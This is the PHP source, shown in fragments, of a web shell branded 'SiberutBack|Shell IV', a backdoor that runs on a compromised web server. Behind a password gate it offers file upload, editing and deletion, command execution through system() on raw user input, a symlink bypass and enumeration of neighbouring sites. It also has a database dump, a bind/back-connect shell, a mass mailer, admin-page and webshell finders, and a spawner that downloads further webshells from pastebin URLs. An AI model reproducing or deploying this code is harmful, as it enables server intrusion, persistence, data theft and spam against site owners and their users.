...
{
  echo "<a href='?home' style='color:black;'>Back To Home</a>";
  phpinfo();
  echo "<script>";
}
?><?php
...
<font color="white"><body bgcolor="black">';
//LoginDetail
...
{
print'<script>document.cookie="user='.$_POST["usrname"].';";document.cookie="pass='.md5($_POST["passwrd"]).';";</script><meta http-equiv="refresh" content="0">';
}
else
{
if($_POST['usrname'])
...
echo '<center><br><br><h1><font face="couriernew"><font color="blue">Siberut</font>Back<font color=blue>|</font>Shell <font color="blue">IV</font></h1>
<form method="post">
...
Password :<input type="password" name="passwrd" value="1234567"><br>
 <input type="submit" value="Login"><br><br><font size="2"> Coded By Cy#b3r00T</center>';
exit;
}
}
@session_start();
@set_time_limit(0);?>
<?php
echo "<center><font face='couriernew'><h2><font face='couriernew'><font color='blue'>Siberut</font>Back<font color='blue'>|</font>Shell <font color='blue'>IV</font></h2></center><hr size='1'>";
//BACKDOORSTART
//SERVERINFO
...
$uname=php_uname();
echo "<pre>
SERVER IP    : <font color='blue'>$ip2</font> / YOUR IP : <font color='blue'>$ip1</font>
WEB SERVER   : <font color='white'>$sof</font>
SYSTEM       : <font color='white'>$uname</font>
DISABLE FUNC : <font color='blue'>$disable_functions</font>
</pre><hr size='1'>";
//UPLOADFILE
...
$files = $_FILES['w4h_file']['name'];
$dest = $root.'/'.$files;
$path = $_GET['dir'];
$error = getcwd();
if(isset($_POST['upload'])) {
    if(is_writable($root)) {
        if(@copy($_FILES['w4h_file']['tmp_name'],$path.'/'.$files)) {
            echo "Sukses! at $path";
        } else {
            echo "<script>alert('Coba Upload Lagi, Jika Gagal = Permission Denied');window.location='?dir=$error';</script>";
        }
    }
}
?><hr size="1"><font size="2"><form action="<?php echo $PHP_SELF;?>" METHOD="GET">
...
<pre>
    <font color="blue"><</font> <a href="?home">Home</a> <font color="blue">></font>&nbsp&nbsp&nbsp<font color="blue"><</font> <a href="?phpinfo">PHP Info</a> <font color="blue">></font>&nbsp&nbsp&nbsp<font color="blue"><</font> <a href="?socket=true">Socket Server</a> <font color="blue">></font>&nbsp&nbsp&nbsp<font color="blue"><</font> <a href="?jumping">Jumping</a> <font color="blue">></font>&nbsp&nbsp&nbsp<font color="blue"><</font> <a href="?symlink">Symlink</a> <font color="blue">></font>&nbsp&nbsp&nbsp<font color="blue"><</font> <a href="?hash-gen">Hash Generator</a> <font color="blue">></font>&nbsp&nbsp&nbsp<font color="blue"><</font> <a href="?hashid">Hash Identify</a> <font color="blue">></font>&nbsp&nbsp&nbsp<font color="blue"><</font> <a href="?dbdump">Database Dump</a> <font color="blue">></font>&nbsp&nbsp&nbsp<font color="blue"><</font> <a href="?encode">Encode/Decode</a> <font color="blue">></font>&nbsp&nbsp&nbsp<font color="blue"><</font> <a href="?backconnect">BackConnect</a> <font color="blue">></font>
<center><font color="blue">< </font><a href="?spawnshell">Shell Spawner</a><font color="blue"> ></font>   <font color="blue">< </font><a href="?adminfinder">Admin Finder</a><font color="blue"> ></font>   <font color="blue">< </font><a href="?adminer">Adminer</a><font color="blue"> ></font>   <font color="blue">< </font><a href="?shellfind">Shell Finder</a><font color="blue"> ></font>   <font color="blue">< </font><a href="?mailer">Mailer</a> <font color="blue">></font>   <font color="blue">< </font><a href="?reverse">Reverse IP</a><font color="blue"> ></font>   <font color="blue">< </font><a href="?about">About</a><font color="blue"> ></font>   <font color="blue">< </font><a href="?del=<?php echo basename($_SERVER['SCRIPT_FILENAME']);?>
">Kill</a><font color="blue"> ></font><hr size="1"></pre></center>
<?php
...
if(isset($_GET['edit']))
{
$kimak=file_get_contents($_REQUEST['edit']);
echo "
...
if(isset($_GET['adminfinder']))
{
  ...
  function urlExist($url)
  {
    ...
    {
      $trying = array('adminweb/','admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/',
      ...
      if(urlExist($urll))
      {
      echo '</script><p align="center">'.$urll.' exists.<br>MATCH FOUND!!!</p><script>';
      exit;
      }
      else
      {
      echo '</script><p align="center">'.$urll.' does not exist.</p><script>';
      }
      }
      echo '</script><p align="center">Could not find admin page.</p><script>';
    }
    else
    {
      echo '</script><p align="center">Invalid URL entered.</p><script>';
    }
      }
}
?>
...
if(isset($_GET['mailer']))
{
  ...
  echo "</script><br>Sending Email To : ".$email." => Success<script>";
  }
  }
}
?>
...
if(isset($_GET['about']))
{
  echo '<center><pre><font color=blue><< </font>Back<font color=blue>|</font>Hack Shell <font color="blue">IV</font>
...
{
echo '<pre><center><b>Decode & Encode Script</b><br>
<form method="post"><br>
...
if(isset($_GET['encode']))
{
  ...
  echo '<textarea cols=100 rows=10 class="inputz" readonly>'.$codi.'</textarea></center><script>';
...
if(isset($_GET['symlink']))
{
  ...
  echo '<script>alert("Just For Linux OS!.")</script>';exit;
  }else{
  $slash="/";
  $basep=str_replace("\\","/",$basep);
  }
  $s=$_SERVER['PHP_SELF'];
  echo '<pre><center><h1>Symlink Bypass Tool</h1>';
  echo '<form method=post action="'.$s.'?symlink">
  ...
  SymLink With OS : <br><input name=ad1syc size=50> << >> <input value="'.getcwd().$slash."backhack_sym".'" name=ad2syc size=50><br><input type=submit value=Submit></form>';
  if ($_POST['ad1syp'] && $_POST['ad2syp']){
  if (symlink($_POST['ad1syp'],$_POST['ad2syp'])){
  echo "<script>alert('Symlink Success')</script>";
  }else{
  echo "<script>alert('Symlink Failed')</script>";
  }}
  if ($_POST['ad1syc'] && $_POST['ad2syc']){
  if (system('ls -s '.$_POST['ad1syc']." ".$_POST['ad2syc'])){
  echo "<script>alert('Symlink Success')</script>";
  }else{echo "<script>alert('Symlink Failed')</script>";
  }}
echo '<br><br><br><script>';
}
?>
<?php
if(isset($_GET['jumping']))
{
  ...
  foreach(getuser() as $user) {
    ...
    print ($i === 0) ? "" : "<p>Total ada $i kamar di ".$ip."</p>";
    echo "<script>";
}
?>
<?php
if(isset($_GET['hash-gen']))
{
$submit = $_POST['enter'];
...
$hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
 ...
 echo '<center><h2>Hash Generator</h2></center></tr>';
  echo 'Your Password         :';
 echo ' <input class="inputz" type="text" name="password" size="40" />';
  echo '<input class="inputzbut" type="submit" name="enter" value="Encrypt!" /><br>';
  echo '<pre>
Result:
...
Sha1 with Salt & MD5  : <input class=inputz type=text size=50 value=' . $hash1_sha1_double . '>';
echo '</pre><script>';
}
?>
<?php
...
{
  error_reporting(0);
  echo '<title>&copy;Copyright Afrizal F.A</title>
  <style>
  html{
  color: white;
  }
  ...
  $sock = (function_exists('socket_create')) ? "ON" : "OFF";
  $ip = gethostbyname($_SERVER['HTTP_HOST']);
  echo '<center><h1>Socket HTTP Server Pure PHP</h1>';
  echo 'IP SERVER : '.$ip;
  echo "<br><br>Socket : ".$sock;
  echo '<br><br><form enctype="multipart/form-data" method="post">Port : <input type="text" name="port"><br><br>HTML : <br><br><textarea name="html"></textarea><br><br><input type="submit" name="socket" value="Start!"></form>';
  if(isset($_POST['socket'])) { set_time_limit(0);
  $address = '0.0.0.0';
  $port = $_POST['port'];
  $htmlmu = $_POST['html']."\n";
  $sock = socket_create(AF_INET, SOCK_STREAM, 0);
  socket_bind($sock, $address, $port) or die('Tidak Bisa Connect Ke IP');
  echo "\n Memulai Koneksi Pada Port $port \n\n";
  while(1) { socket_listen($sock);
  ...
  echo 'By Afrizal F.A</td></table><script>';
}
?>
<?php
if(isset($_GET['backconnect']))
{
  echo "<pre><center><form method='post'>
  Bind Port:<br>
...
if(isset($_GET['shellfind']))
{
  ...
  echo "</script><br /><span class='start'>Scanning ".$url."<br /><br /></span>";
  echo "ReSulT:<br /><br /><script>";

  $shells = array("default.php","008.php","kimak.php","mini.php","noname.php", "0z.php","ngidx.php","config.php","asu.php","extremecrw.php","home.phtml","home.php","tamvan.phtml","sad.php","kalemtod.php","idx.php","WSO.php","dz.php","cpanel.php","cpn.php","sql.php","mysql.php","madspot.php","cp.php","cpbt.php","sYm.php",
  "x.php","r99.php","lol.php","jo.php","wp.php","whmcs.php","shellz.php","d0main.php","d0mains.php","users.php",
  "Cgishell.pl","killer.php","akses.php","changeall.php","2.php","Sh3ll.php","dz0.php","dam.php","user.php","dom.php","whmcs.php",
  "vb.zip","r00t.php","c99.php","webshell.php","gaza.php","1.php","wp.zip"."wp-content/plugins/disqus-comment-system/disqus.php",
  ...
  "/wp-content/plugins/count-per-day/js/yc/d00.php", "admins/","admins.asp","admins.php","wp.zip","wso2.5.1","pasir.php","pasir2.php","up.php","cok.php","newfile.php","upl.php",".php","a.php","crot.php","kontol.php","hmei7.php");
  ...
  //Result
  echo "</script><a href='$url$shell'>$url$shell</a> <span class='found'>Done :D</span><br /><br/><br/>"; //
...
function getfile($name) {
  ...
  if($name === "priv8") $get = array("https://pastebin.com/raw/7UM5eku8", "0z.php");
  if($name === "c99") $get = array("https://pastebin.com/raw/hPzPr5A6", "mini.php");
    $fp = fopen($get[1], "w");
    $ch = curl_init();
...
{
  $adminerr = getfile('adminer');
  if($adminerr){
    echo "<center><a href='adminer.php' target='_blank'>Done!!!</a><script>";
  }else{
    echo "</script><center>Permission Denied!<script>";
  }
print "$adminerr";
}
?>
<?php
if(isset($_GET['spawnshell']))
{
  echo "<center><form method='GET' action='?spawnshell'>
  ...
  {
    echo "</script>";
    $shellnya = $_GET['spawnshell'];
    $shellnjing = getfile($shellnya);
    if($shellnya === "indoxploit"){
      echo "<a href='idx.php'>Done!!</a><br>Pass: IndoXploit<script>";
      print $shellnjing;
    }elseif($shellnya === "noname"){
      echo "<a href='nn.php'>Done!!</a><br>Pass: zeeblaxx<script>";
      print $shellnjing;
    }elseif($shellnya === "priv8"){
      echo "<a href='0z.php'>Done!!</a><script>";
      print $shellnjing;
    }elseif($shellnya === "c99"){
      echo "<a href='mini.php'>Done!!</a><script>";
      print $shellnjing;
    }
  }else{
...
{
  $deletedir=$_GET['deldir'];
  if(rmdir($deletedir)){
    echo "Directory Deleted!<script>";
  }else{
    echo "Permission Denied!<script>";
  }
}
?>
<?php
if(isset($_GET['rename']))
{
  ...
  $kimak = $_GET['rename'];
  $new = $_GET['newname'];
  echo "<form action='?dir=$cwd&rename' method='GET'>
  ...
  <input type='submit' name='renamed' value='Rename!'></form><script>";
  if($_GET['renamed'])
  {
    $hajar = rename ("$kimak","$cwd/$new");
    if($hajar)
    {
      $hajar1 = "</script><script>window.location='?dir=$cwd';</script>";
    }
    else{
      $hajar1 = "</script>Rename Failed!<script>";
    }
    print "$hajar1";
  }
}
...
if(isset($_GET['makedir']))
{
  ...
  if($_GET['makedir']){
    $newdir=$_GET['newdir'];
    if(mkdir($newdir)){
      echo "</script><script>window.location='?dir=$cwd';</script>";
    }else{
      echo "Permission Denied!";
    }
  }
...
if(isset($_GET['newfile']))
{
  ...
  if($_GET['makefile']){
    $filenya=$_GET['newfile'];
    $kampank="echo '' > $filenya";
    echo '</script>';
    if(system("$kampank")){
      echo "Permission Denied!";
    }else{
      echo "<script>window.location='?edit=$filenya';</script>";
    }
  }
}
?>
...
if(isset($_GET['filesrc'])){
  ...
  echo $_GET['filesrc'];
  echo '<hr size="1">';
  echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre><script>');
  }
?>
<?php
///Delete File
...
if(@unlink($file))
 {
   echo 'Sukses Menghapus File<script>';
 }else{
   echo 'Gagal Menghapus File<script>';
 }
}
?>
</pre>
<?php
//DirExplore
echo '<pre><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td>
Current Directory :';
if(isset($_GET['dir'])){
$path = $_GET['dir'];
}else{
...
echo '">'.$pat.'</a>/';
}echo '<p align=right><font color=blue>< </font><a href=?dir='.$path.'&makedir>New Directory</a><font color=blue> ></font>&nbsp&nbsp&nbsp<font color=blue>< </font><a href=?dir='.$path.'&newfile>New File</a><font color=blue> ></font>&nbsp&nbsp&nbsp</p>';
echo "</td></table><table width=100% border=0 cellpadding=7 cellspacing=0 align=center>
<tr>
...
if(!is_dir($path.'/'.$dir) || $dir == '.z' || $dir == '..z')
{
  $size=filesize($dir)/1024;
  $size = round($size,3);
  if($size >= 1024){
...
$s = filetype("$path/$dir");
  echo "<td><a href='?filesrc=$path/$dir'>$dir</a><br></td><td>$s</td><td>$size</td><td>".perms($dir)."<td>
  <a href='$PHP_SELF?edit=$path/$dir'>Edit</a> | <a href='$PHP_SELF?del=$path/$dir'>Delete</a> | <a href='$PHP_SELF?dir=$path&rename=$path/$dir'>Rename</a></td></tr>"; // File
}else{
  $s = filetype("$path/$dir");
  echo "<td><a href='?dir=$path/$dir'>$dir</a><br></td><td>$s</td><td>--</td><td>".perms($path)."</td><td><a href='$PHP_SELF?deldir=".$path."/".$dir."'>Delete</a> | <a href='$PHP_SELF?dir=$path&rename=$path/$dir'>Rename</a></td></tr>"; // Folder
}
}
?>
